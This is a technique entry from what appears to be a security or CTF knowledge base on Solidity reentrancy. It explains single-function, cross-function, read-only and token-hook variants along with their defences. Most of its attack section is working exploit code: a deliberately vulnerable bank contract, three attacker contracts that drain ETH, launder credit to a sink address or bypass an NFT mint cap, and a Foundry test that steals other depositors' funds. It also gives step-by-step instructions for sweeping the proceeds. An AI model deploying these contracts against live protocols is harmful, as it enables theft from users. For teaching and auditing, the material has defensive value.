---
title: "Reentrancy - Single-Function, Cross-Function, Read-Only and Callback"
category: blockchain
subcategory: reentrancy
type: technique
tags: [blockchain, reentrancy, solidity, evm, cross-function-reentrancy, read-only-reentrancy, erc777, erc721, onerc721received, tokensreceived, checks-effects-interactions, call-value, fallback, receive, nonreentrant, foundry, dao-hack]
difficulty: medium
summary: "External call before state update lets the callee re-enter and drain. Four flavours: same function, sibling function, view-only, and token hooks."
when_to_use:
  - "A withdraw/claim function sends ETH or tokens before zeroing a balance"
  - "The contract uses .call{value:}() with no reentrancy guard"
  - "An ERC777, ERC721 safeTransfer or ERC1155 hook fires mid-transaction"
  - "A price/share getter reads a balance that is temporarily inconsistent"
tools: [foundry, forge, cast, slither]
related: [attacker-contract-patterns, oracle-flashloan-manipulation, gas-and-dos, solidity-vuln-checklist]
---

## TL;DR

If a contract makes an external call while its own state is temporarily wrong, the callee can call
back in and observe or exploit that wrong state. Classic: `balances[msg.sender]` is zeroed *after*
the ETH transfer, so a recursive `withdraw()` drains the contract.

## Recognise it

- `(bool ok, ) = msg.sender.call{value: amount}("");` followed by `balances[msg.sender] = 0;`
- Any `.call{value:}` / `.transfer` / `.send` to a user-controlled address that is not the last
  statement of the function.
- `safeTransferFrom` on ERC721/ERC1155 (invokes `onERC721Received` on the recipient).
- ERC777 tokens (`tokensToSend` / `tokensReceived` hooks fire on *every* transfer).
- A `nonReentrant` modifier applied to some functions but not others -> cross-function reentrancy.
- A `view` function used as a price oracle by a *third* contract -> read-only reentrancy.
- `.transfer`/`.send` (2300 gas stipend) mostly blocks reentrancy but is still vulnerable if the
  callee is a contract with a cheap fallback, and is broken by gas repricing.

## Theory

The EVM has no call stack isolation between a contract and its callees; `CALL` transfers control
and the callee can call back synchronously. The only defences are:

1. **Checks-Effects-Interactions**: validate, then write state, then call out.
2. **A mutex** (`ReentrancyGuard`: an `_status` slot set to `ENTERED` during the call).
3. **Pull over push**: never send funds inside a state-mutating flow.

Depth is bounded by the 1024-frame call-depth limit and by the 63/64 gas rule, but in practice a
dozen re-entries is plenty.

### The four flavours

| Flavour | Mechanism | Guard that stops it |
|---|---|---|
| Single-function | `withdraw()` re-enters `withdraw()` | `nonReentrant` on that function, or CEI |
| Cross-function | `withdraw()` re-enters `transfer()` which reads the stale balance | a *shared* mutex across all mutating functions |
| Read-only | re-enter a `view` getter (e.g. `getVirtualPrice()`) while balances are mid-update; a *third-party* contract prices off it | `nonReentrantView` / reading the guard state |
| Callback / hook | ERC777 `tokensReceived`, ERC721 `onERC721Received`, ERC1155 `onERC1155Received`, or a custom `IReceiver` | CEI + treat every token transfer as an external call |

## Attack

1. Find the external call and the state write that follows it.
2. Deploy an attacker contract whose `receive()`/hook re-enters.
3. Add a depth counter so you stop before running out of gas or draining below a multiple of your
   deposit (otherwise the final iteration reverts and unwinds everything).
4. Seed it with the minimum deposit, trigger, then sweep the proceeds to your EOA.

## Code

### Vulnerable contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // BUG: interaction before effect
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");
        balances[msg.sender] = 0;           // <-- too late
    }

    // cross-function surface: reads the same stale balance
    function transferTo(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function totalAssets() external view returns (uint256) {
        return address(this).balance;       // read-only reentrancy surface
    }
}
```

### Attacker (single-function)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IEtherBank public immutable bank;
    address public immutable owner;
    uint256 public depth;
    uint256 public constant MAX_DEPTH = 10;

    constructor(address _bank) payable {
        bank = IEtherBank(_bank);
        owner = msg.sender;
    }

    function pwn() external payable {
        require(msg.sender == owner, "not owner");
        uint256 unit = address(this).balance;
        require(unit > 0, "fund me first");
        bank.deposit{value: unit}();
        bank.withdraw();
        // sweep
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {
        // stop before the bank runs dry, otherwise the inner call reverts everything
        if (depth < MAX_DEPTH && address(bank).balance >= msg.value) {
            depth++;
            bank.withdraw();
        }
    }
}
```

### Attacker (cross-function)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
    function transferTo(address to, uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/// Even if withdraw() were nonReentrant, transferTo() is not, and during the
/// external call our balance is still recorded. We move the credit to a helper
/// address, then withdraw again from that address.
contract CrossFunctionAttacker {
    IEtherBank public immutable bank;
    address public immutable owner;
    address public immutable sink;
    bool private entered;

    constructor(address _bank, address _sink) payable {
        bank = IEtherBank(_bank);
        sink = _sink;
        owner = msg.sender;
    }

    function pwn() external {
        require(msg.sender == owner, "not owner");
        bank.deposit{value: address(this).balance}();
        bank.withdraw();
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            // balances[address(this)] has NOT been zeroed yet
            bank.transferTo(sink, bank.balances(address(this)));
        }
    }
}
```

### Attacker (ERC721 `onERC721Received`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMintable {
    function mint() external;            // mints one free NFT via _safeMint
    function minted(address) external view returns (uint256);
}

/// _safeMint calls onERC721Received BEFORE the per-address mint counter is bumped,
/// so we re-enter and blow past the per-wallet cap.
contract MintReenter {
    IMintable public immutable nft;
    uint256 public count;
    uint256 public constant WANT = 10;

    constructor(address _nft) {
        nft = IMintable(_nft);
    }

    function pwn() external {
        nft.mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        returns (bytes4)
    {
        if (++count < WANT) {
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

### Foundry PoC harness

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {EtherBank} from "../src/EtherBank.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";

contract ReentrancyTest is Test {
    EtherBank bank;
    address attackerEoa = address(0xA11CE);

    function setUp() public {
        bank = new EtherBank();
        // fill the bank with other users' money
        for (uint256 i = 1; i <= 10; i++) {
            address u = address(uint160(i));
            vm.deal(u, 10 ether);
            vm.prank(u);
            bank.deposit{value: 10 ether}();
        }
        vm.deal(attackerEoa, 1 ether);
    }

    function test_drain() public {
        vm.startPrank(attackerEoa);
        ReentrancyAttacker a = new ReentrancyAttacker{value: 1 ether}(address(bank));
        a.pwn();
        vm.stopPrank();
        assertGt(attackerEoa.balance, 10 ether, "did not drain");
    }
}
```

## Variants & pitfalls

- **Read-only reentrancy**: the victim is not the contract you re-enter, it is a *consumer* of its
  view function. Curve-style `get_virtual_price()` during a `remove_liquidity` ETH transfer returns
  an inflated price; a lending market that prices LP tokens with it lets you over-borrow. Look for
  "protocol A reads protocol B's getter".
- **ERC777 is the sneaky one**: an ordinary-looking `transfer()` of an ERC777 token calls
  `tokensReceived` on the recipient and `tokensToSend` on the sender, both registered through the
  ERC1820 registry. A contract that is CEI-safe for ETH can still be reentered here.
- **Balance-check guards fail**: `require(address(this).balance == before - amount)` after the call
  is bypassable with force-fed ether (`selfdestruct`) - see `gas-and-dos`.
- **Stopping condition**: always cap recursion. If the last inner `withdraw()` reverts (bank empty),
  `require(ok)` propagates and the whole tx reverts, and you get nothing.
- **`.transfer` is not a fix**, just a speed bump: 2300 gas is enough for an event or a single
  `SLOAD`, and any future gas repricing changes the calculus.
- **Cross-contract reentrancy**: two contracts sharing a state contract, guarded independently.
- **Guards that only wrap the entry point**: `nonReentrant` on `withdraw` but not on `claimRewards`.
- **Detection**: `slither . --detect reentrancy-eth,reentrancy-no-eth,reentrancy-benign`.

## Tools

- `forge test -vvvv` - the call trace makes the re-entry obvious.
- `slither` reentrancy detectors.
- `cast run <txhash> --trace` to replay and see the nested `CALL`s.

## References

- OpenZeppelin `ReentrancyGuard` source and its documentation of the mutex pattern.
- Solidity docs: "Security Considerations - Reentrancy".
